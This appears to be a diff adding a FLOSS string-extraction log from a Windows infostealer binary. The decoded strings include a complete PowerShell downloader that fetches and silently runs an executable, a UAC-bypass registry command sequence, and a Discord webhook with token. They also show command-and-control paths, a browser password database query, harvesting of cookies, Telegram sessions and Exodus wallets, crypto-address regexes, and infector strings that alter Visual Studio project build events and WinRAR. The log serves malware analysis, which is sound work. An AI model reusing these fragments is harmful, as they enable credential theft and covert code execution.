@@ -1,0 +1,705 @@
+WARNING: viv_utils: cfg: incomplete control flow graph                                                  
+finding decoding function features: 100%|â| 12549/12549 [04:44<00:00, 44.07 functions/s, skipped 1704 li
+INFO: floss.stackstrings: extracting stackstrings from 9819 functions
+INFO: floss.results: expaexpaexpaexpand 3nd 3nd 3nd 32-by2-by2-by2-byte kte kte kte k                   
+INFO: floss.results:  !"#$%&'()*+,-./0123456789:;<=>?@AB;<;:9876543210/.-,+*)('&%$#"!                   
+INFO: floss.results:    "description" : "Domain Actions URL List that can work with experiment buckets.",
+INFO: floss.results:    "listFormat" : 2,                                                               
+INFO: floss.results:    "name" : "DomainActions",                                                       
+INFO: floss.results:    "version" : "3.0.0.14"                                                          
+INFO: floss.results: 1.455D1A3B5F7FA199F27CB165FA6F54DF7972FBB6C62D422A14C2415791175931                 
+INFO: floss.results:    "description" : "Well Known Domains URL List",                                  
+INFO: floss.results:    "listFormat" : 1,                                                               
+INFO: floss.results:    "name" : "WellKnownDomainsListTypes",                                           
+INFO: floss.results:    "version" : "1.2.0.0"                                                           
+INFO: floss.results: 1.8D64E3A35EE2C3E0B9E33AFD63069FDC917A5647DD1E20C5EAD97955FB6979F9                 
+INFO: floss.results: .tmp                                                                               
+INFO: floss.results: \d{16}$                                                                            
+INFO: floss.results: \d{15}$                                                                            
+INFO: floss.results: File does not exist:                                                               
+INFO: floss.results: .rcd                                                                               
+INFO: floss.results: Bxor                                                                               
+INFO: floss.results: Band                                                                               
+INFO: floss.results: )-Band((                                                                           
+INFO: floss.results: )-Bor((                                                                            
+INFO: floss.results: )))-shl1)-shr1)                                                                    
+INFO: floss.results: (((-bnot(-bnot(                                                                    
+INFO: floss.results: [SDK]  Running infector                                                            
+INFO: floss.results: [SDK]  Done.                                                                       
+INFO: floss.results: Modified and copied to:                                                            
+INFO: floss.results: No need to modify!:                                                                
+INFO: floss.results: [WinRAR] Running infector                                                          
+INFO: floss.results: [WinRAR] Done.                                                                     
+INFO: floss.results: [IMGUI CPP] Retrieving paths.                                                      
+INFO: floss.results: [IMGUI CPP] Found %i imgui_impl_win32.cpp Files                                    
+INFO: floss.results: [IMGUI CPP] Running infector                                                       
+INFO: floss.results: [IMGUI CPP] Done.                                                                  
+INFO: floss.results: [VCXPROJ] Found %i .vcxproj Files                                                  
+INFO: floss.results: [VCXPROJ] Running infector                                                         
+INFO: floss.results: [VCXPROJ] Done.                                                                    
+INFO: floss.results: [CSPROJ] Found %i .csproj Files                                                    
+INFO: floss.results: [CSPROJ] Running infector                                                          
+INFO: floss.results: [CSPROJ] Done.                                                                     
+INFO: floss.results: %+#I64o                                                                            
+INFO: floss.results: %+#I64o                                                                            
+INFO: floss.results: 0QWB                                                                               
+INFO: floss.results: false                                                                              
+INFO: floss.results: null                                                                               
+INFO: floss.results: true                                                                               
+INFO: floss.results: false                                                                              
+INFO: floss.results: null                                                                               
+INFO: floss.results: true                                                                               
+INFO: floss.results: /0:/0:...(0(                                                                       
+INFO: floss.results: /0:/0:/*                                                                           
+INFO: floss.results: 3010-/0-/0                                                                         
+INFO: floss.results: 0123456789ABCDEF                                                                   
+INFO: floss.results: QQWB                                                                               
+INFO: floss.results: %dH@                                                                               
+INFO: floss.results: %+#I64o                                                                            
+INFO: floss.results: %+#I64o                                                                            
+INFO: floss.results: %+#I64o                                                                            
+INFO: floss.results: %+#I64o                                                                            
+extracting stackstrings: 100%|ââââââââââââââââââââââââââââââ| 9819/9819 [02:28<00:00, 66.07 functions/s]
+INFO: floss.tightstrings: extracting tightstrings from 961 functions...
+INFO: floss.results: CfWmpkOQULmmgN8u3eDSW01                                                            
+INFO: floss.results: C:\Windows\omadmapi.dll                                                            
+INFO: floss.results: ^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$                                               
+INFO: floss.results: ^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,34}$                                            
+INFO: floss.results: ^(?:[LM3][a-km-zA-HJ-NP-Z1-9]{26,33})$                                             
+INFO: floss.results: ^(?:0x[a-fA-F0-9]{40})$                                                            
+INFO: floss.results: ^(?:[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})$                                          
+INFO: floss.results: ^(?:r[0-9a-zA-Z]{33})$                                                             
+INFO: floss.results: ^(?:A[0-9a-zA-Z]{33})$                                                             
+INFO: floss.results: ^(?:D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})$                                
+INFO: floss.results: (^s*[1-9A-HJ-NP-Za-km-z]{44}s*$)                                                   
+INFO: floss.results: -Za-z1-9]{33}$                                                                     
+INFO: floss.results: 3198791665                                                                         
+INFO: floss.results: 1096175631                                                                         
+INFO: floss.results: 1096175631                                                                         
+INFO: floss.results: 18446744072613375985                                                               
+INFO: floss.results: size                                                                               
+INFO: floss.results: offset                                                                             
+INFO: floss.results: Failed to open ASAR file                                                           
+INFO: floss.results: Failed to read input file                                                          
+INFO: floss.results: [!] size_send_PA <= 0                                                              
+INFO: floss.results: [!] size_recv_PB <= 0                                                              
+INFO: floss.results: [!] Bind/UDP not supported                                                         
+INFO: floss.results: [!] gethostbyname                                                                  
+INFO: floss.results: [!] IPv6 not supported                                                             
+INFO: floss.results: [!] size_send_PC <= 0                                                              
+INFO: floss.results: [!] size_recv_PC <= 0                                                              
+INFO: floss.results: [!] connect() failed                                                               
+INFO: floss.results: [!] send() sent a different number of bytes than expected                          
+INFO: floss.results: [+] A DATA RECV = %i | DATA SEND = %i                                              
+INFO: floss.results: [+] B DATA RECV = %i | DATA SEND = %i                                              
+INFO: floss.results: [!] select > 0                                                                     
+INFO: floss.results: [!] recvd_A (%i) <= 0                                                              
+INFO: floss.results: [!] recvd_B (%i) <= 0                                                              
+INFO: floss.results: Agent                                                                              
+INFO: floss.results: http://                                                                            
+INFO: floss.results: Host                                                                               
+INFO: floss.results: http://www.google.com                                                              
+INFO: floss.results: Mozilla/5.0 (Windows NT 14_73_31; WOW64)                                           
+INFO: floss.results: hash=2239784366428af5e59516a8fd0a0faf                                              
+INFO: floss.results: Response too big, size:                                                            
+INFO: floss.results: No Internet to download!                                                           
+INFO: floss.results: Failed to calculate length of base64 decoded data                                  
+INFO: floss.results: Failed to decode base64 string                                                     
+INFO: floss.results: Failed to decrypt data using DPAPI                                                 
+INFO: floss.results: Failed to create EVP_CIPHER_CTX                                                    
+INFO: floss.results: Failed to decrypt ciphertext                                                       
+INFO: floss.results: Failed to finalize AES-GCM decryption                                              
+INFO: floss.results: Failed to initialize AES-GCM decryption                                            
+INFO: floss.results: Unsupported encryption format                                                      
+INFO: floss.results: Set WshShell = CreateObject("WScript.Shell")                                       
+INFO: floss.results: reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings" /f                     
+INFO: floss.results: " /f & reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
+INFO: floss.results: reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "wscript.exe 
+INFO: floss.results: start /B ComputerDefaults.exe                                                      
+INFO: floss.results: S-1-5-21-3974942081-2796901225-3823420655-1001                                     
+INFO: floss.results: DiscordSession                                                                     
+INFO: floss.results: discordapp.com                                                                     
+INFO: floss.results: /api/webhooks/1399862658039156736/PSv7MO3fflIGgm4Y8RzgZvsn-DEOp7bjSCKKcONb3MXn9wbUByJBRZ__mxB2hroYlFLI
+INFO: floss.results: Content-Type: application/json                                                     
+INFO: floss.results: American Express                                                                   
+INFO: floss.results: Unknown Card Provider                                                              
+INFO: floss.results: [In DomainAct] No Dir                                                              
+INFO: floss.results: [In DomainAct] Directory done                                                      
+INFO: floss.results: \manifest.fingerprint                                                              
+INFO: floss.results: \domain_actions.dll                                                                
+INFO: floss.results: [In Known] Edge Good to go!                                                        
+INFO: floss.results: [In Known] deletion part                                                           
+INFO: floss.results: \well_known_domains.dll                                                            
+INFO: floss.results: [In Known] No Dir                                                                  
+INFO: floss.results: [In Known] Directory done                                                          
+INFO: floss.results: \manifest.fingerprint                                                              
+INFO: floss.results: Inside Existing Startup                                                            
+INFO: floss.results: yes Exist 2 petty:                                                                 
+INFO: floss.results: Inside Non Existing Startup                                                        
+INFO: floss.results: C:\ProgramData\bungee.boo                                                          
+INFO: floss.results: Hide and Clear Done                                                                
+INFO: floss.results: Chrome_WidgetWin                                                                   
+INFO: floss.results: Input contains non-digit characters.                                               
+INFO: floss.results: https://discordapp.com/api/v8/users/@me                                            
+INFO: floss.results: [!] WSAStartup error: %i                                                           
+INFO: floss.results: [+] WSAStartup success                                                             
+INFO: floss.results: [+] Connect to SK5 success                                                         
+INFO: floss.results: [!] Connect to SK5 (%i) error                                                      
+INFO: floss.results: [!] sock INVALID_SOCKET                                                            
+INFO: floss.results: http://bot.whatismyipaddress.com/                                                  
+INFO: floss.results: A WinINet Example Program                                                          
+INFO: floss.results: A WinINet Example Program                                                          
+INFO: floss.results: Address:                                                                           
+INFO: floss.results: </body>                                                                            
+INFO: floss.results: Failed to create DXGI Factory.                                                     
+INFO: floss.results: No valid hardware GPU found.                                                       
+INFO: floss.results: No Compatible GPU                                                                  
+INFO: floss.results: NVIDIA                                                                             
+INFO: floss.results: Radeon                                                                             
+INFO: floss.results: Intel                                                                              
+INFO: floss.results: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ                               
+INFO: floss.results: SabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789                    
+INFO: floss.results: cCdDgGhHiIjJkKlLmMoOpPqQsSuUwWxXyYzZ                                               
+INFO: floss.results: FromBase64String                                                                   
+INFO: floss.results: $path = "/Stb/Retev.php?bl=" + $stubId + ".txt"                                    
+INFO: floss.results: $key = "qpb9,83M8n@~{ba;W`$,}"                                                     
+INFO: floss.results: p "https://youtu.be/akoxddx6lgc"                                                   
+INFO: floss.results: Start-Sleep -Seconds 20                                                            
+INFO: floss.results: param ([string]$url)                                                               
+INFO: floss.results: if (-not $url) { return }                                                          
+INFO: floss.results: $r = Invoke-RestMethod -Uri $url -Method Get                                       
+INFO: floss.results: $c = $r | Out-String                                                               
+INFO: floss.results: $rp = "([a-zA-Z0-9+/=]{20,})\.deodorantkindredimpo"                                
+INFO: floss.results: $m = [regex]::Match($c, $rp)                                                       
+INFO: floss.results: if (!$m.Success -or !$m.Groups[1].Value) { throw }                                 
+INFO: floss.results: $domain = d -s $m.Groups[1].Value -k $key                                          
+INFO: floss.results: $dl = "https://" + $domain + $path                                                 
+INFO: floss.results: $g = [System.Guid]::NewGuid().ToString()                                           
+INFO: floss.results: $t = [System.IO.Path]::GetTempPath()                                               
+INFO: floss.results: $f = Join-Path $t ($g + ".exe")                                                    
+INFO: floss.results: $wc = New-Object System.Net.WebClient                                              
+INFO: floss.results: $b = $wc.DownloadData($dl)                                                         
+INFO: floss.results: if ($b.Length -gt 0) {                                                             
+INFO: floss.results: [System.IO.File]::WriteAllBytes($f, $b)                                            
+INFO: floss.results: Start-Process -FilePath $f -WindowStyle Hidden                                     
+INFO: floss.results: param ([string]$s, [string]$k)                                                     
+INFO: floss.results: $b = [System.Convert]::FromBase64String($s)                                        
+INFO: floss.results: $t = [System.Text.Encoding]::UTF8.GetString($b)                                    
+INFO: floss.results: $r = New-Object char[] $t.Length                                                   
+INFO: floss.results: for ($i = 0; $i -lt $t.Length; $i++) {                                             
+INFO: floss.results: $r[$i] = [char]($t[$i] - $k[$i % $k.Length])                                       
+INFO: floss.results: return -join $r                                                                    
+INFO: floss.results:   </Target>                                                                        
+INFO: floss.results:   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">                           
+INFO: floss.results: <Exec Command="                                                                    
+INFO: floss.results: </Command>                                                                         
+INFO: floss.results: </PreBuildEvent>                                                                   
+INFO: floss.results: <PreBuildEvent>                                                                    
+INFO: floss.results: <Command>                                                                          
+INFO: floss.results: Error: Could not open the file for reading:                                        
+INFO: floss.results: Error: Could not open the file for writing:                                        
+INFO: floss.results: All backslashes have been replaced with forward slashes in the file:               
+INFO: floss.results: SOFTWARE\Microsoft\Windows Kits\Installed Roots                                    
+INFO: floss.results: Failed to open registry key.                                                       
+INFO: floss.results: Failed to read registry value.                                                     
+INFO: floss.results: Failed to find SDK versions.                                                       
+INFO: floss.results: Error: Could not open the file! Path:                                              
+INFO: floss.results: Error opening file                                                                 
+INFO: floss.results: #include <tchar.h>                                                                 
+INFO: floss.results: #include <string>                                                                  
+INFO: floss.results: io.BackendPlatformName = "imgui_impl_win32";                                       
+INFO: floss.results: VCCLibraries_                                                                      
+INFO: floss.results: VCCLibraries                                                                       
+INFO: floss.results: endif                                                                              
+INFO: floss.results: _WINNETWK_                                                                         
+INFO: floss.results: cmd.exe /c "move "                                                                 
+INFO: floss.results: powershell -WindowStyle Hidden                                                     
+INFO: floss.results: Already infected, skipping                                                         
+INFO: floss.results: Not modified yet, proceeding wit                                                   
+INFO: floss.results: .txt' -OutFile $env:TEMP\                                                          
+INFO: floss.results: ; Start-Process -FilePath $env:TEMP\                                               
+INFO: floss.results:  -WindowStyle Hidden"                                                              
+INFO: floss.results: reg add "HKCR\WinRAR\shell\open\command" /ve /d "                                  
+INFO: floss.results: [INFEKT DBG] Infekt Starting                                                       
+INFO: floss.results: [INFEKT DBG] Full End                                                              
+INFO: floss.results: \Opera Software\Opera Stable                                                       
+INFO: floss.results: \Microsoft\Edge\User Data                                                          
+INFO: floss.results: \Google\Chrome\User Data                                                           
+INFO: floss.results: \BraveSoftware\Brave-Browser\User Data                                             
+INFO: floss.results: \Mozilla\Firefox\Profiles                                                          
+INFO: floss.results: \Opera Software\Opera GX Stable\User Data                                          
+INFO: floss.results: \Opera Software\Opera GX Stable                                                    
+INFO: floss.results: C:\Program Files                                                                   
+INFO: floss.results: ProgramFiles(x86)                                                                  
+INFO: floss.results: C:\Program Files (x86)                                                             
+INFO: floss.results: \BraveSoftware\Brave-Browser\Application\brave.exe                                 
+INFO: floss.results: \Microsoft\Edge\Application\msedge.exe                                             
+INFO: floss.results: \Google\Chrome\Application\chrome.exe                                              
+INFO: floss.results: \Programs\Opera\opera.exe                                                          
+INFO: floss.results: \Opera\opera.exe                                                                   
+INFO: floss.results: ppData\Local\Programs\Opera\opera.exe                                              
+INFO: floss.results: C:\Users\                                                                          
+INFO: floss.results: \Programs\Opera GX\opera.exe                                                       
+INFO: floss.results: \Opera GX\opera.exe                                                                
+INFO: floss.results: ppData\Local\Programs\Opera GX\opera.exe                                           
+INFO: floss.results: kernel32.dll                                                                       
+INFO: floss.results: " --remote-debugging-port=0                                                        
+INFO: floss.results: " --headless --disable-gpu --no-sandbox --disable-dev-shm-usage --user-data-dir="  
+INFO: floss.results: [*] Discovering profiles in:                                                       
+INFO: floss.results: blood_flash                                                                        
+INFO: floss.results: screen_flicker                                                                     
+INFO: floss.results: blue_screen                                                                        
+INFO: floss.results: matrix_rain                                                                        
+INFO: floss.results: glitch_bands                                                                       
+INFO: floss.results: static_noise                                                                       
+INFO: floss.results: spiral_collapse                                                                    
+INFO: floss.results: screen_melt                                                                        
+INFO: floss.results: colour_cycle                                                                       
+INFO: floss.results: invert_colours                                                                     
+INFO: floss.results: zoom_in                                                                            
+INFO: floss.results: jumpscare_classic                                                                  
+INFO: floss.results: jumpscare_screamer                                                                 
+INFO: floss.results: fake_error                                                                         
+INFO: floss.results: CRITICAL_PROCESS_DIED                                                              
+INFO: floss.results: cursor_trails                                                                      
+INFO: floss.results: darkside always runs                                                               
+INFO: floss.results: powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('
+INFO: floss.results: \Telegram Desktop                                                                  
+INFO: floss.results: Telegram Found, Harvesting...                                                      
+INFO: floss.results: \connection_hash                                                                   
+INFO: floss.results: \*" -DestinationPath "                                                             
+INFO: floss.results: powershell Compress-Archive -Path "                                                
+INFO: floss.results: /api/mnr/bobby31.php?type=APLATG&security=Daytone                                  
+INFO: floss.results: boundary123456                                                                     
+INFO: floss.results: Content-Disposition: form-data; name="file"; filename="                            
+INFO: floss.results: Content-Type: application/zip                                                      
+INFO: floss.results: Content-Type: multipart/form-data; boundary=                                       
+INFO: floss.results: Invalid encrypted data size                                                        
+INFO: floss.results: Failed to create cipher context                                                    
+INFO: floss.results: Decryption failed                                                                  
+INFO: floss.results: Tag verification failed                                                            
+INFO: floss.results: Failed to initialize decryption                                                    
+INFO: floss.results: Failed to parse                                                                    
+INFO: floss.results: Profile                                                                            
+INFO: floss.results: \Guest Profile                                                                     
+INFO: floss.results: \System Profile                                                                    
+INFO: floss.results: \Default                                                                           
+INFO: floss.results: Profile:                                                                           
+INFO: floss.results: \Login Data                                                                        
+INFO: floss.results: No 'Login Data' file found in profile:                                             
+INFO: floss.results: CLD.db                                                                             
+INFO: floss.results: Cannot open database:                                                              
+INFO: floss.results: SELECT origin_url, username_value, password_value FROM logins                      
+INFO: floss.results: Failed to execute query:                                                           
+INFO: floss.results: URLbb:                                                                             
+INFO: floss.results: Username:                                                                          
+INFO: floss.results: Password NEW:                                                                      
+INFO: floss.results: Browser:                                                                           
+INFO: floss.results: [-] No %s Processes Found.                                                         
+INFO: floss.results: d Target Cookie File (Instance PID: %ld)                                           
+INFO: floss.results: cked File!                                                                         
+INFO: floss.results: /Stb/PokerFace/init.php?id=Ppkvum                                                  
+INFO: floss.results: [COOKIE] Halfway                                                                   
+INFO: floss.results: At HWID Retrieving results                                                         
+INFO: floss.results: Results of hwid check:                                                             
+INFO: floss.results: Main Check 2 Renewed                                                               
+INFO: floss.results: Main Check 3 Getting In Process                                                    
+INFO: floss.results: powershell Compress-Archive -Path "                                                
+INFO: floss.results: S/api/mnr/bobby31.php?type=APLADEX&security=Daytone                                
+INFO: floss.results: balista.lol                                                                        
+INFO: floss.results: /api/mnr/bobby31.php?type=APLADEX&security=Daytone                                 
+INFO: floss.results: boundary123456                                                                     
+INFO: floss.results: Content-Disposition: form-data; name="file"; filename="                            
+INFO: floss.results: SContent-Type: application/zip                                                     
+INFO: floss.results: SInternetOpen failed                                                               
+INFO: floss.results: SInternetConnect failed                                                            
+INFO: floss.results: HttpOpenRequest failed                                                             
+INFO: floss.results: Content-Type: multipart/form-data; boundary=                                       
+INFO: floss.results: HttpSendRequest failed                                                             
+INFO: floss.results: Getting in ASAR Infection Before Card                                              
+INFO: floss.results: ASAR Infection Done Going For Card                                                 
+INFO: floss.results: %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x                                   
+INFO: floss.results: Microsoft Basic Render                                                             
+INFO: floss.results: NVIDIA GeForce RTX 3060 Ti                                                         
+INFO: floss.results: 3198791665                                                                         
+INFO: floss.results: 18446744072613384177                                                               
+INFO: floss.results: Mozilla/5.0 (Windows NT 14_73_31; WOW64)                                           
+INFO: floss.results: Mozilla/5.0 (Windows NT 14_73_31; WOW64)                                           
+INFO: floss.results: hash                                                                               
+INFO: floss.results: identity                                                                           
+INFO: floss.results: ;<;:9876                                                                           
+extracting tightstrings from function 0x14053c3e0: 100%|ââââââ| 961/961 [03:54<00:00,  4.09 functions/s]
+INFO: floss.string_decoder: decoding strings
+INFO: floss.results: MNha                                                                               
+INFO: floss.results: o;F,K`o                                                                            
+INFO: floss.results: Ex-~#i0qx                                                                          
+INFO: floss.results:  !"#$%&'()*+,-./0123456789:;<=>?@AB;<;:9876543210/.-,+*)('&%$#"!                   
+INFO: floss.results: POST                                                                               
+INFO: floss.results: cipher                                                                             
+INFO: floss.results: protocol                                                                           
+INFO: floss.results: Content-Type                                                                       
+INFO: floss.results: 112032                                                                             
+INFO: floss.results: Initilazing Mainq                                                                  
+INFO: floss.results: Array                                                                              
+INFO: floss.results: cannot get value                                                                   
+INFO: floss.results: Initilazing Hide#i                                                                 
+INFO: floss.results: 122033                                                                             
+INFO: floss.results: 0932                                                                               
+INFO: floss.results: C:\ProgramData\wkkr.bug                                                            
+INFO: floss.results: 1033                                                                               
+INFO: floss.results: 062032                                                                             
+INFO: floss.results: iterator out of range                                                              
+INFO: floss.results: length                                                                             
+INFO: floss.results: GetString                                                                          
+INFO: floss.results: 072033                                                                             
+INFO: floss.results: 0432                                                                               
+INFO: floss.results: ActionSentTime                                                                     
+INFO: floss.results: 0533                                                                               
+INFO: floss.results: type                                                                               
+INFO: floss.results: 022033                                                                             
+INFO: floss.results: iterator does not fit current value                                                
+INFO: floss.results: 1232                                                                               
+INFO: floss.results: 092032                                                                             
+INFO: floss.results: cannot compare iterators of different containers                                   
+INFO: floss.results: ActionID                                                                           
+INFO: floss.results: Clone() is not implemented yet.                                                    
+INFO: floss.results: system.co                                                                          
+INFO: floss.results: vert                                                                               
+INFO: floss.results: 102033                                                                             
+INFO: floss.results: 2147483647                                                                         
+INFO: floss.results: 0732                                                                               
+INFO: floss.results: CreateDecryptor                                                                    
+INFO: floss.results: Integer: input length is too small                                                 
+INFO: floss.results: Padding                                                                            
+INFO: floss.results: cannot use key() for non-object iterators                                          
+INFO: floss.results: -16843010                                                                          
+INFO: floss.results: 4278124286                                                                         
+INFO: floss.results: 18302063728033398268                                                               
+INFO: floss.results: JKKK0                                                                              
+INFO: floss.results: JKKK                                                                               
+INFO: floss.results: JKKK                                                                               
+INFO: floss.results: JKKK                                                                               
+INFO: floss.results: Failed to decrypt data using DPAPI                                                 
+INFO: floss.results: 88784908                                                                           
+INFO: floss.results: 90883807                                                                           
+INFO: floss.results: Authorization:                                                                     
+INFO: floss.results: JKKK0                                                                              
+INFO: floss.results: HARDWARE\DESCRIPTION\System\CentralProcessor\0                                     
+INFO: floss.results: ProcessorNameString                                                                
+INFO: floss.results: JKKK                                                                               
+INFO: floss.results: JKKKUr"@                                                                           
+INFO: floss.results: JKKK4                                                                              
+INFO: floss.results: Unknown                                                                            
+INFO: floss.results: convert                                                                            
+INFO: floss.results: LOCALAPPDATA                                                                       
+INFO: floss.results: ProgramFiles                                                                       
+INFO: floss.results: ProgramFiles(x86)                                                                  
+INFO: floss.results: C:\Program Files                                                                   
+INFO: floss.results: 2Xvb                                                                               
+INFO: floss.results: \Google\Chrome\Application\chrome.exe                                              
+INFO: floss.results: gram Files (x86)                                                                   
+INFO: floss.results: fefefefe                                                                           
+INFO: floss.results: %08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x                                   
+INFO: floss.results: 1240428288                                                                         
+INFO: floss.results: \Exodus\exodus.w0)                                                                 
+INFO: floss.results:  IP Empty Error:                                                                   
+INFO: floss.results: .?AVSelfTestFailure@CryptoPP@@                                                     
+INFO: floss.results: .?AUNoChannelSupport@BufferedTransformation@CryptoPP@@                             
+INFO: floss.results: .?AVBitBucket@CryptoPP@@                                                           
+INFO: floss.results: .?AVArraySink@CryptoPP@@                                                           
+INFO: floss.results: .?AVNullNameValuePairs@CryptoPP@@                                                  
+INFO: floss.results: .?AVBERDecodeErr@CryptoPP@@                                                        
+INFO: floss.results: .?AUInputRejected@?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@   
+INFO: floss.results: .?AVInteger@CryptoPP@@                                                             
+INFO: floss.results: .?AUEC2NPoint@CryptoPP@@                                                           
+INFO: floss.results: .?AUECPPoint@CryptoPP@@                                                            
+INFO: floss.results: .?AVASN1Object@CryptoPP@@                                                          
+INFO: floss.results: .?AVStore@CryptoPP@@                                                               
+INFO: floss.results: .?AV?$AutoSignaling@V?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@@CryptoPP@@
+INFO: floss.results: .?AV?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@                 
+INFO: floss.results: .?AVBERGeneralDecoder@CryptoPP@@                                                   
+INFO: floss.results: .?AVDERGeneralEncoder@CryptoPP@@                                                   
+INFO: floss.results: .?AVByteQueue@CryptoPP@@                                                           
+INFO: floss.results: .?AV?$Bufferless@VBufferedTransformation@CryptoPP@@@CryptoPP@@                     
+INFO: floss.results: .?AVByteArrayParameter@CryptoPP@@                                                  
+INFO: floss.results: .?AUInitializeInteger@CryptoPP@@                                                   
+INFO: floss.results: .?AVWalker@ByteQueue@CryptoPP@@                                                    
+INFO: floss.results: .?AVlength_error@std@@                                                             
+INFO: floss.results: .?AVbad_function_call@std@@                                                        
+INFO: floss.results: .?AVregex_error@std@@                                                              
+INFO: floss.results: .?AVbad_exception@std@@                                                            
+INFO: floss.results: .?AVruntime_error@std@@                                                            
+INFO: floss.results: .?AVbad_alloc@std@@                                                                
+INFO: floss.results: .?AVexception@std@@                                                                
+INFO: floss.results: .?AVbad_array_new_length@std@@                                                     
+INFO: floss.results: .?AVexception@detail@json_abi_v3_11_3@nlohmann@@                                   
+INFO: floss.results: .?AVfailure@ios_base@std@@                                                         
+INFO: floss.results: .?AUhresult_changed_state@winrt@@                                                  
+INFO: floss.results: .?AUhresult_access_denied@winrt@@                                                  
+INFO: floss.results: .?AVrange_error@std@@                                                              
+INFO: floss.results: .?AVsystem_error@std@@                                                             
+INFO: floss.results: .?AUhresult_class_not_available@winrt@@                                            
+INFO: floss.results: .?AVCAtlException@ATL@@                                                            
+INFO: floss.results: .?AUhresult_error@winrt@@                                                          
+INFO: floss.results: .?AUhresult_invalid_argument@winrt@@                                               
+INFO: floss.results: .?AVlogic_error@std@@                                                              
+INFO: floss.results: .?AUhresult_not_implemented@winrt@@                                                
+INFO: floss.results: .?AVtype_error@detail@json_abi_v3_11_3@nlohmann@@                                  
+INFO: floss.results: .?AVbad_cast@std@@                                                                 
+INFO: floss.results: .?AVException@CryptoPP@@                                                           
+INFO: floss.results: .?AVparse_error@detail@json_abi_v3_11_3@nlohmann@@                                 
+INFO: floss.results: .?AUhresult_illegal_delegate_assignment@winrt@@                                    
+INFO: floss.results: .?AVinvalid_iterator@detail@json_abi_v3_11_3@nlohmann@@                            
+INFO: floss.results: .?AVInvalidArgument@CryptoPP@@                                                     
+INFO: floss.results: .?AVother_error@detail@json_abi_v3_11_3@nlohmann@@                                 
+INFO: floss.results: .?AUhresult_out_of_bounds@winrt@@                                                  
+INFO: floss.results: .?AVout_of_range@std@@                                                             
+INFO: floss.results: .?AVfilesystem_error@filesystem@std@@                                              
+INFO: floss.results: .?AVinvalid_argument@std@@                                                         
+INFO: floss.results: .?AVNotImplemented@CryptoPP@@                                                      
+INFO: floss.results: .?AUhresult_illegal_state_change@winrt@@                                           
+INFO: floss.results: .?AV_System_error@std@@                                                            
+INFO: floss.results: .?AUhresult_no_interface@winrt@@                                                   
+INFO: floss.results: .?AUhresult_illegal_method_call@winrt@@                                            
+INFO: floss.results: .?AUhresult_wrong_thread@winrt@@                                                   
+INFO: floss.results: .?AVout_of_range@detail@json_abi_v3_11_3@nlohmann@@                                
+INFO: floss.results: .?AUhresult_class_not_registered@winrt@@                                           
+INFO: floss.results: .?AUhresult_canceled@winrt@@                                                       
+INFO: floss.results: .?AV_ExceptionPtr_normal@?A0x6e02efe5@@                                            
+INFO: floss.results: .?AV?$_ExceptionPtr_static@Vbad_alloc@std@@@?A0x6e02efe5@@                         
+INFO: floss.results: .?AV?$_ExceptionPtr_static@Vbad_exception@std@@@?A0x6e02efe5@@                     
+INFO: floss.results: .?AV_Locimp@locale@std@@                                                           
+INFO: floss.results: .?AV?$basic_ios@_WU?$char_traits@_W@std@@@std@@                                    
+INFO: floss.results: .?AV?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@                              
+INFO: floss.results: .?AV?$basic_ostream@_WU?$char_traits@_W@std@@@std@@                                
+INFO: floss.results: .?AV?$basic_filebuf@_WU?$char_traits@_W@std@@@std@@                                
+INFO: floss.results: .?AV?$codecvt@GDU_Mbstatet@@@std@@                                                 
+INFO: floss.results: .?AV?$ctype@G@std@@                                                                
+INFO: floss.results: .?AUmessages_base@std@@                                                            
+INFO: floss.results: .?AUmoney_base@std@@                                                               
+INFO: floss.results: .?AUtime_base@std@@                                                                
+INFO: floss.results: .?AV?$num_get@_WV?$istreambuf_iterator@_WU?$char_traits@_W@std@@@std@@@std@@       
+INFO: floss.results: .?AV?$num_put@_WV?$ostreambuf_iterator@_WU?$char_traits@_W@std@@@std@@@std@@       
+INFO: floss.results: .?AV?$numpunct@_W@std@@                                                            
+INFO: floss.results: .?AV?$collate@_W@std@@                                                             
+INFO: floss.results: .?AV?$messages@_W@std@@                                                            
+INFO: floss.results: .?AV?$money_get@_WV?$istreambuf_iterator@_WU?$char_traits@_W@std@@@std@@@std@@     
+INFO: floss.results: .?AV?$money_put@_WV?$ostreambuf_iterator@_WU?$char_traits@_W@std@@@std@@@std@@     
+INFO: floss.results: .?AV?$moneypunct@_W$0A@@std@@                                                      
+INFO: floss.results: .?AV?$_Mpunct@_W@std@@                                                             
+INFO: floss.results: .?AV?$moneypunct@_W$00@std@@                                                       
+INFO: floss.results: .?AV?$time_get@_WV?$istreambuf_iterator@_WU?$char_traits@_W@std@@@std@@@std@@      
+INFO: floss.results: .?AV?$time_put@_WV?$ostreambuf_iterator@_WU?$char_traits@_W@std@@@std@@@std@@      
+INFO: floss.results: .?AV?$num_get@GV?$istreambuf_iterator@GU?$char_traits@G@std@@@std@@@std@@          
+INFO: floss.results: .?AV?$num_put@GV?$ostreambuf_iterator@GU?$char_traits@G@std@@@std@@@std@@          
+INFO: floss.results: .?AV?$numpunct@G@std@@                                                             
+INFO: floss.results: .?AV?$collate@G@std@@                                                              
+INFO: floss.results: .?AV?$messages@G@std@@                                                             
+INFO: floss.results: .?AV?$money_get@GV?$istreambuf_iterator@GU?$char_traits@G@std@@@std@@@std@@        
+INFO: floss.results: .?AV?$money_put@GV?$ostreambuf_iterator@GU?$char_traits@G@std@@@std@@@std@@        
